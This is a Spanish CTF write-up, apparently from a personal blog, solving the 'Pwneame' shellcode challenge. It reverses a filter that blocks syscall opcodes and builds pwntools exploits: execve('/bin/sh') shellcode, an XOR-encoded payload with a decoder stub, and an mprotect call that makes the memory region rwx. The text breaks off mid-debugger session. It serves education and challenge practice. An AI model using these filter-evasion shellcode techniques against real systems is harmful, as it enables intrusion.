@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Q4 Pwneame</title>
+
+  <meta name="description" content="Resolución del reto Pwneame del CTF de Q4">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Q4 Pwneame">
+  <meta name="twitter:description" content="Resolución del reto Pwneame del CTF de Q4">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/q4.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Q4 Pwneame">
+  <meta property="og:description" content="Resolución del reto Pwneame del CTF de Q4">
+  <meta property="og:image" content="/images/otros/q4.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/q4.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Q4 Pwneame" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation1">Explotación 1</a></li>
+        <li><a href="#exploitation2">Explotación 2</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Q4</h4>
+    <picture><img src="/images/otros/q4.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Pwneame</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/Q4CTF/Pwneame/pwneame.zip">binario</a> nos pide una entrada donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, nos devuelve un mensaje y corrompe de alguna forma inesperada sin más</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./pwneame</span><span class="p">
+
+pwn it: 
+AAAAAAAABBBBBBBB
+
+Go!
+
+zsh: segmentation fault (core dumped)  ./pwneame  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos desensamblando el programa con <code class="language-plaintext highlighter-rouge">ida</code>, la función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a <code class="language-plaintext highlighter-rouge">mmap</code> para reservar <code class="language-plaintext highlighter-rouge">0x64</code> o <code class="language-plaintext highlighter-rouge">100</code> bytes de memoria en la dirección <code class="language-plaintext highlighter-rouge">0xcafe0000</code>, luego con memset llena el buffer que retorna que nosotros llamamos shellcode con <code class="language-plaintext highlighter-rouge">0's</code></p>
+<a href="/challenges/pwneame/1.png" target="_blank"><div><p><img src="/challenges/pwneame/1.png"></p></div></a>
+
+<p class="plain-text">Luego muestra un mensaje con puts y lee <code class="language-plaintext highlighter-rouge">0x64</code> bytes, llama a la función <code class="language-plaintext highlighter-rouge">forbidden</code> pasandole el shellcode como argumento y realiza un salto condicional si retorna <code class="language-plaintext highlighter-rouge">0</code></p>
+<a href="/challenges/pwneame/2.png" target="_blank"><div><p><img src="/challenges/pwneame/2.png"></p></div></a>
+
+<p class="plain-text">Si realiza el salto <code class="language-plaintext highlighter-rouge">jz</code> utiliza <code class="language-plaintext highlighter-rouge">mprotect</code> para establecer permisos <code class="language-plaintext highlighter-rouge">4</code> a <code class="language-plaintext highlighter-rouge">0x100</code> bytes del buffer asignado y realiza un <code class="language-plaintext highlighter-rouge">call rdx</code> donde previamente se guardó el shellcode</p>
+<a href="/challenges/pwneame/3.png" target="_blank"><div><p><img src="/challenges/pwneame/3.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">forbidden</code> recibe el shellcode y lo guarda en una variable address, además inicializa un iterador <code class="language-plaintext highlighter-rouge">i</code> en <code class="language-plaintext highlighter-rouge">0</code> que se utilizará para recorrer todo el shellcode</p>
+<a href="/challenges/pwneame/4.png" target="_blank"><div><p><img src="/challenges/pwneame/4.png"></p></div></a>
+
+<p class="plain-text">Compara que el iterador sea menor o igual que <code class="language-plaintext highlighter-rouge">98</code>, si lo es compara el byte en la posición <code class="language-plaintext highlighter-rouge">i</code> contra el byte <code class="language-plaintext highlighter-rouge">0xf</code>, esto se hace porque los shellcodes generalmente ejecutan la instrucción <code class="language-plaintext highlighter-rouge">syscall</code> o <code class="language-plaintext highlighter-rouge">sysenter</code> las cuales en su opcode tienen <code class="language-plaintext highlighter-rouge">0f</code></p>
+<a href="/challenges/pwneame/5.png" target="_blank"><div><p><img src="/challenges/pwneame/5.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ asm</span><span class="p"> -c amd64 </span><span class="am">'syscall'</span><span class="p">
+0f05
+
+</span><span class="ve">❯ asm</span><span class="p"> -c amd64 </span><span class="am">'sysenter'</span><span class="p">  
+0f34</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En caso de que pase esa comprobación compara el byte en la posición <code class="language-plaintext highlighter-rouge">i</code> con <code class="language-plaintext highlighter-rouge">0xcd</code> y el byte en la posición <code class="language-plaintext highlighter-rouge">i + 1</code> con <code class="language-plaintext highlighter-rouge">0x80</code>, esto se hace porque otra forma de realizar una <code class="language-plaintext highlighter-rouge">syscall</code> es ejecutar <code class="language-plaintext highlighter-rouge">int 0x80</code> cuyo opcode es <code class="language-plaintext highlighter-rouge">cd80</code>, en caso de que exista una de estos bytes llama a <code class="language-plaintext highlighter-rouge">puts</code> y retorna <code class="language-plaintext highlighter-rouge">1</code> evitando asi que se ejecute el shellcode</p>
+<a href="/challenges/pwneame/6.png" target="_blank"><div><p><img src="/challenges/pwneame/6.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ asm </span><span class="p">-c amd64 </span><span class="am">'int 0x80'</span><span class="p">  
+cd80</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation1">
+<br><h3 class="post-title">Explotación 1</h3><br>
+
+<p class="plain-text">Comenzamos mirando las protecciones del binario, este contiene <code class="language-plaintext highlighter-rouge">FULL RELRO</code> que impide escribir en la tabla <code class="language-plaintext highlighter-rouge">got</code>, contiene <code class="language-plaintext highlighter-rouge">PIE</code> que hace aleatoria la dirección base del binario y <code class="language-plaintext highlighter-rouge">NX</code> que impide ejecutar shellcode en el stack sin embargo como aqui el programa ejecuta el <code class="language-plaintext highlighter-rouge">call</code> a un espacio reservado no nos afecta directamente</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> pwneame
+[</span><span class="az">*</span><span class="p">] '/home/user/pwneame'
+    Arch:       amd64-64-little  
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces iniciamos nuestro exploit estableciendo un breakpoint en el <code class="language-plaintext highlighter-rouge">call rdx</code> y lo que enviaremos cuando nos pida un input será simplemente <code class="language-plaintext highlighter-rouge">8</code> nops o <code class="language-plaintext highlighter-rouge">0x90</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./pwneame"</span><span class="p">,</span><span class="s"> "b *main+197</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi"> \n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al llegar a la instrucción <code class="language-plaintext highlighter-rouge">call rdx</code> entramos a la llamada y vemos que se ejecutarán nuestros <code class="language-plaintext highlighter-rouge">8</code> nops, comprobamos que el input se interpreta como shellcode</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00005ec6130d83b0 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()  
+</span><span class="ro">pwndbg></span><span class="p">  x/i $rip
+=></span><span class="az"> 0x5ec6130d83b0 </span><span class="p">&lt</span><span class="am">main</span><span class="p">+197>:</span><span class="ve">	call</span><span class="ro">   rdx
+pwndbg></span><span class="p"> si
+</span><span class="az">0x00000000cafe0000 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/8i $rip
+=> </span><span class="az">0xcafe0000</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0001</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0002</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0003</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0004</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0005</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0006</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+   </span><span class="az">0xcafe0007</span><span class="p">:</span><span class="ve">	nop</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si podemos ejecutar shellcode normalmente enviamos un shellcode como este de <code class="language-plaintext highlighter-rouge">21</code> bytes que ejecute un <code class="language-plaintext highlighter-rouge">execve("/bin/sh", NULL, NULL);</code> sin embargo por la limitación en la <code class="language-plaintext highlighter-rouge">syscall</code> al intentar ejecutarlo nos muestra <code class="language-plaintext highlighter-rouge">Forbidden</code> y no lo ejecuta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./pwneame"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()  </span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './pwneame': pid 57510  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+Forbidden!
+[</span><span class="az">*</span><span class="p">] Got EOF while reading in interactive
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una técnica muy conocida es aplicar una operación <code class="language-plaintext highlighter-rouge">xor</code> al shellcode, en este caso con la key <code class="language-plaintext highlighter-rouge">0x1</code> y enviar un decoder que en este caso funciona de la siguiente forma</p>
+<p class="plain-text">El decoder inicia guardando la longitud del shellcode en <code class="language-plaintext highlighter-rouge">rcx</code>, guarda en <code class="language-plaintext highlighter-rouge">rdi</code> la dirección donde inicia y hace un <code class="language-plaintext highlighter-rouge">short jump</code> para evitar ejecutar el shellcode xoreado, luego realiza un bucle donde por cada iteración realiza el mismo <code class="language-plaintext highlighter-rouge">xor</code> en el byte y decremente <code class="language-plaintext highlighter-rouge">rcx</code>, incrementa <code class="language-plaintext highlighter-rouge">rdi</code> para pasar al siguiente byte y continua hasta que <code class="language-plaintext highlighter-rouge">rcx</code> llega a <code class="language-plaintext highlighter-rouge">0</code> y salta al shellcode original que ya ha sido decodeado con el <code class="language-plaintext highlighter-rouge">xor</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm, xor
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./pwneame"</span><span class="p">,</span><span class="s"> "b *main+197</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()</span><span class="p">
+
+shellcode </span><span class="o">=</span><span class="p"> xor(shellcode, </span><span class="mi">0x1</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x15"</span><span class="p">)</span><span class="c1">               # $rsp = len(shellcode)</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rcx"</span><span class="p">)</span><span class="c1">                 # $rcx = counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add edi, 0x8"</span><span class="p">)</span><span class="c1">            # $rdi = shellcode start</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x17"</span><span class="p">)</span><span class="c1">              # jump xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span><span class="c1">                      # save xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor byte ptr [rdi], 0x1"</span><span class="p">)</span><span class="c1"> # restore xored byte</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"dec cl"</span><span class="p">)</span><span class="c1">                  # decrease counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc edi"</span><span class="p">)</span><span class="c1">                 # increase address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jrcxz $-0x1c"</span><span class="p">)</span><span class="c1">            # if $rcx == 0 -> exec shellcode</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $-0x9"</span><span class="p">)</span><span class="c1">               # if $rcx != 0 -> loop to decode</span><span class="p">  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos ejecutar nuestro exploit nos encontramos un gran problema, al intentar ejecutar el primer <code class="language-plaintext highlighter-rouge">xor</code> el programa corrompe debido a que el espacio reservado tiene solo privilegios <code class="language-plaintext highlighter-rouge">x</code> pero no <code class="language-plaintext highlighter-rouge">w</code> por lo que no puede modificar la memoria</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00005aa942c383b0 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> c
+Continuando.
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x00000000cafe001d </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=> </span><span class="az">0xcafe001d</span><span class="p">:	</span><span class="ve">xor</span><span class="p">    BYTE PTR [</span><span class="ro">rdi</span><span class="p">],</span><span class="az">0x1</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> vmmap 0xcafe0000
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="ro">►       0xcafe0000         0xcafe1000 --xp     1000      0 [anon_cafe] +0x0</span><span class="p">
+    0x5aa942c37000     0x5aa942c38000 r--p     1000      0 /home/user/pwneame  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Afortunadamente cuando llegamos al <code class="language-plaintext highlighter-rouge">call</code> el registro <code class="language-plaintext highlighter-rouge">rcx</code> se almacena la dirección de <code class="language-plaintext highlighter-rouge">mprotect + 11</code>, podriamos usar <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar estos privilegios a gusto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x000061b0c04e03b0 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rcx
+   </span><span class="az">0x7cdfa351e8bb </span><span class="p">&lt</span><span class="am">mprotect</span><span class="p">+11>:</span><span class="ve">    cmp</span><span class="ro">    rax</span><span class="p">,</span><span class="az">0xfffffffffffff001  </span><span class="p">  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, nuestro shellcode guarda en <code class="language-plaintext highlighter-rouge">rax</code> la dirección de <code class="language-plaintext highlighter-rouge">mprotect</code> a partir del registro <code class="language-plaintext highlighter-rouge">rcx</code>, luego en <code class="language-plaintext highlighter-rouge">rdi</code> la dirección <code class="language-plaintext highlighter-rouge">0xcafe0000</code> que es donde queremos modificar, en <code class="language-plaintext highlighter-rouge">rsi</code> la longitud <code class="language-plaintext highlighter-rouge">0x1000</code> y finalmente en <code class="language-plaintext highlighter-rouge">rdx</code> los privilegios <code class="language-plaintext highlighter-rouge">7</code> que equivale a <code class="language-plaintext highlighter-rouge">rwx</code>, una vez seteados llamamos a rax que contiene el <code class="language-plaintext highlighter-rouge">mprotect</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./pwneame"</span><span class="p">,</span><span class="s"> "b *main+197</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
+context.arch </span><span class="o">= </span><span class="s">"amd64"</span><span class="p">
+
+payload </span><span class="o"> =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"lea rax, [rcx - 0xb]"</span><span class="p">)</span><span class="c1"> # $rax = mprotect()  </span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor rdi, rdi"</span><span class="p">)</span><span class="c1">         # $rdi = 0x0</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov edi, 0xcafeffff"</span><span class="p">)</span><span class="c1">  # $rdi = 0xcafeffff</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc di"</span><span class="p">)</span><span class="c1">               # $rdi = 0xcafe0000</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x10"</span><span class="p">)</span><span class="c1">            # $rsp = &0x10</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">              # $rsi = 0x10</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"shl rsi, 0x8"</span><span class="p">)</span><span class="c1">         # $rsi = 0x1000</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x7"</span><span class="p">)</span><span class="c1">             # $rsp = &0x7</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdx"</span><span class="p">)</span><span class="c1">              # $rdx = 0x7</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"call rax"</span><span class="p">)</span><span class="c1">             # call mprotect()</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.recvlines(</span><span class="mi">3</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, cuando llegamos al breakpoint saltamos a la llamada y podemos ver que se llamará a la función <code class="language-plaintext highlighter-rouge">mprotect(0xcafe0000, 0x1000, 0x7);</code> que modificará los permisos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x000063e80d1b73b0 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> si
+</span><span class="az">0x00000000cafe0000 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> nextcall
+Temporary breakpoint -10,</span><span class="az"> 0x00000000cafe0019 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()  
+</span><span class="ro">pwndbg></span><span class="p"> x/i 0xcafe0019
+=></span><span class="az"> 0xcafe0019</span><span class="p">:</span><span class="ve">	call</span><span class="ro">   rax  
+pwndbg></span><span class="p"> x/i $rax
+  </span><span class="az">0x74f93151e8b0 </span><span class="p">&lt</span><span class="am">mprotect</span><span class="p">>:</span><span class="ve">	endbr64</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
+</span><span class="az">$1</span><span class="p"> = 0xcafe0000
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rsi
+</span><span class="az">$2</span><span class="p"> = 0x1000
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rdx
+</span><span class="az">$3</span><span class="p"> = 0x7
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando llamamos a <code class="language-plaintext highlighter-rouge">mprotect</code> podemos comprobar los permisos de la dirección <code class="language-plaintext highlighter-rouge">0xcafe0000</code> y ahora se han modificado a <code class="language-plaintext highlighter-rouge">rwx</code> por lo que deberiamos poder escribir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> ni
